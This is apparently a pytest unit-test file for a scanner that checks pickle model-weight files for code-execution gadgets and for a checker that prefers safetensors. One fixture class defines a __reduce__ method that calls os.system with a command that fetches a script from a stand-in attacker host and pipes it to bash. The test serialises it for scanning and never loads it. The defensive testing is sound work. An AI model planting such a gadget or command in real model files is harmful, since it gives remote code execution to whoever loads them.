"""Unit tests for Pickle Model Weight Deserialization Scanner (TC-MOD9-001).

Verifies detection of arbitrary code execution gadgets (__reduce__, os.system)
without triggering runtime code execution.
"""

import pickle
import pytest

from services.mod09_ai_spm.internal.weight_scanner.format_verifier import WeightFormatVerifier
from services.mod09_ai_spm.internal.weight_scanner.pickle_scanner import PickleScanner


class MaliciousExploit:
    """Simulated malicious model checkpoint using standard pickle __reduce__ exploit."""

    def __reduce__(self):
        import os
        return (os.system, ("curl -s https://evil.lograven.io/exfil | bash",))


def test_tc_mod9_001_malicious_pickle_rce_detected():
    """TC-MOD9-001: Feed synthetic .pkl containing __reduce__ calling os.system.

    Expected: Scanner flags CRITICAL_PICKLE_RCE and extracts malicious payload without executing it.
    """
    # 1. Create malicious serialized payload
    exploit_obj = MaliciousExploit()
    malicious_bytes = pickle.dumps(exploit_obj, protocol=4)

    # 2. Scan bytes directly via PickleScanner (safe disassembly)
    result = PickleScanner.scan_bytes(malicious_bytes)

    # 3. Verify assertion criteria
    assert result.is_safe is False
    assert result.finding_code == "CRITICAL_PICKLE_RCE"
    assert any(
        f.get("module") == "posix" or f.get("module") == "nt" or f.get("module") == "os"
        for f in result.dangerous_imports
    ) or any(f.get("callable") == "system" for f in result.dangerous_imports)
    assert any("curl" in p or "bash" in p for p in result.extracted_payloads)


def test_safe_pickle_payload():
    """Verifies that legitimate tensor data or primitives are marked safe."""
    safe_data = {
        "weights": [0.123, -0.456, 0.789],
        "vocab_size": 32000,
        "model_type": "transformer",
    }
    safe_bytes = pickle.dumps(safe_data, protocol=4)

    result = PickleScanner.scan_bytes(safe_bytes)
    assert result.is_safe is True
    assert result.finding_code is None
    assert len(result.dangerous_imports) == 0


def test_weight_format_evaluation():
    """Verifies format verifier flags legacy unsafe extensions and recommends safetensors."""
    # Legacy PyTorch bin / pickle
    eval_pkl = WeightFormatVerifier.evaluate_format("pytorch_model.bin")
    assert eval_pkl["is_safe_format"] is False
    assert eval_pkl["has_unsafe_deserialization_risk"] is True
    assert "safetensors" in eval_pkl["recommendation"]

    # Modern safetensors
    eval_safe = WeightFormatVerifier.evaluate_format("model.safetensors")
    assert eval_safe["is_safe_format"] is True
    assert eval_safe["has_unsafe_deserialization_risk"] is False
